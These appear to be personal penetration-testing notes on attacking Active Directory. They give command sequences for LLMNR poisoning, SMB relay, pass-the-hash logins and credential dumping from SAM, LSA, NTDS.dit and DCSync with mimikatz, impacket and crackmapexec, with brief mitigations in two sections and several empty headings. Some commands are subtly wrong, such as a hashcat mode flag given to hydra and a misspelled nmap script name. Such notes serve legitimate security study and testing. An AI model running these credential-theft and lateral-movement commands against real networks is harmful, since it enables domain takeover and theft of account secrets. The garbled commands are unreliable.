# <center>Active Directory Pentesting Notes</center>
> - Important Key Notes
> 1. Domain Controller (DC)
> 2. Tree, Forests
> 3. Group Policies
> 4. Classes and Objects, Atributes(info about objects)
> 5. Account types:- Domain/Workstation admins, Regular Users, Service Accounts
> 6. NTLM Hashing  LM:NT  NTLMv2

# 1. LLMNR Posioning 
LLMNR stand for Link Local Multicast Name Resolution: used to identify host when dns down or name failiar it was enabled by defalut

` sudo responder -i wlan0 -dwPv `

Crapture NTLMv2 Hashes => Creak and Use to login

`hydra -m 5600 hash_file /wordlist.txt`

***Mitigations:*** Turn of Multicast Name Resolution, Implament strong Network Access Control, Strong Password Policy (Complaxity)
<br>

# 2. SMD Relay Attack
Insted of cracking hashes we can pass those hases or relay them
### Requirements:
1. Check SMD signin enable but not required or disabled or not enforced
`nmap --script=smb2-securiry-node.nse -p445 IP/Subnet`
2. Relayd User Must be Admin on Target Machine

Commands
Changes in Responder `sudo nana /etc/responder/responder.conf`
>SMD = Off <br>
>HTTP = Off
1. ` sudo responder -i wlan0 -dwPv `
2. `python3 ntlmrelayx.py -tf targets.txt   -smb2support`

**You can use those hases to ***Get a Shell ***  with some tools like**
// you can also do pass the hash attack  
`psexec domain/user:password @IP_target`  
`evilwin-rm`    
`winrmexec`           
`smbexec`          

***Mitigations:*** Enable SMD SignIn,Disable NTLM Auth on Network, Account Tearing, Legal admin restrictions
<br>

# 3. IPv6 Attack 


<br>

# 5. ASReprosting


<br>

# 4. Kerbrosting 
 
 

<br>

# 6. Pass The Hash
If you have NTLM Hashes you dont need to crack them insted you can pass this hashes in the palce of password to get a shell
known as Pass The Hash (PTH) Attack 
1. Collect Hashes 
2. Use those Hashes to Pass The Hash Attack

## Use Cases

 - Authenticated SMB Shares List

`impacket-smbclient -hashes :NT_HASH username@IP`
 - Login Via SMB 

`impacket-psexec -hashes :NT_HASH username@IP`
 -  Login to Win-rm Port (5985, 5986)

  `Evil-winrm -i IP -H NT_HASH -u user`
 -  RDP Session Login

     `xfreerdp /v:IP /u:user /pth:NT_HASH`
> RDP window not by defalut allow Hash login 

<br>

# 7.  Pass The Ticket


<br>

# 8. Over Pass The Hash (combination of PTH + PTT)


<br>

# 9. Golden Ticket

<br>

# 10. Silver Ticknt

<br>

# 11. Dumping Password & Hashes



## 1. Credential Dumping  - ***SAM (Security Account Manager)*** 
stores data like OS Users, Password in Local Computer
> This Need Administrative Privilage 
`reg save HKLM\SAM C:\SAM`
`reg save HKLM\SYSTEM C:\SYSTEM`
use `samdump` or `impacket-secretdump` tool in kali to get password from both SAM, SYSTEM file 


 - Credential Dumping - ***Mimikatz*** 
 a automated to to dump password hashes
    1. Transfer the mimikatz.exe on windows need administrator
    2. `mimikatz.exe` => execute mimikatz.exe
    3. `privilege::debug` => bypass security policy
    4. `token::elevate` =>  impersonate the administrator user to get NT/Autority
    5. `lsadump::sam C:\SAM C:\SYSTEM` => dump hashes


## 2. Credential Dumping with ***LSA (Local Security Autority)*** 
responsible for authenticate the user at local computer and logs all the things
it have SAM database, browser data,SQL creds etc.

 - Credential Dumping - ***Mimikatz*** 

    1. Transfer the mimikatz.exe on windows need administrator
    2. `mimikatz.exe` => execute mimikatz.exe
    3. `privilege::debug` => bypass security policy
    4. `token::elevate` =>  impersonate the administrator user to get NT/Autority
    5. `sekurlsa::logonpasswords` or `lsadump::secrets`  => dump hashes

(OR)

```
[kali]

$ crackmapexec smb IP -u user -p password -M lsassy
$ crackmapexec smb IP -u user -p password --lsa

```

## 3. Credential Dumping From NTDS.DIT 
NTDS stand for **New technology Directory Service** DAT stand for **Directory Information Tree** (its also a database stored in **DC (Domain Controller)** which stores infomation like Objects,Applications,Crendentials and Attributes)

`crackmapexec -smb IP -u user -p password -ntds drsuapi`

## 4. Credential Dumping With DCSync Attack
DCSync or Domain Controller Syncronization attack it work when Org. **Use More than One Domain Controller to Manange Objects in Active Directory** so Active Directory Use a service/feature
DRS (Directory Replication Service) to sync the data between all the domain controller togather


 - Credential Dumping - ***Mimikatz***
    1. Transfer the mimikatz.exe on windows need administrator
    2. `mimikatz.exe` => execute mimikatz.exe
    3. `privilege::debug` => bypass security policy
    4. `token::elevate` =>  impersonate the administrator user to get NT/Autority
    5. `lsadump::dcsync /user:USERNAME`   => dump hashes


# 11. 
